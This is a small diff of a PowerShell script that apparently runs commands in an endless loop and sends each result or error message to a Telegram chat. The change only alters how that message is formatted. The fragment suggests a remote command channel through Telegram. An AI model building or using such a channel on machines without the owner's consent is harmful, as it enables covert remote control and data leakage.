@@ -168,8 +168,8 @@ while ($true) {
                                     $exec = $_.Exception.Message
                                 }
                         
-                                Send-TelegramMessage -chatId $chatId -text  "``````powershell $exec``````"
-
+                               # Send-TelegramMessage -chatId $chatId -text  "``````powershell $exec``````"
+                                Send-TelegramMessage -chatId $chatId -text  $exec
                             }
                         }
                  
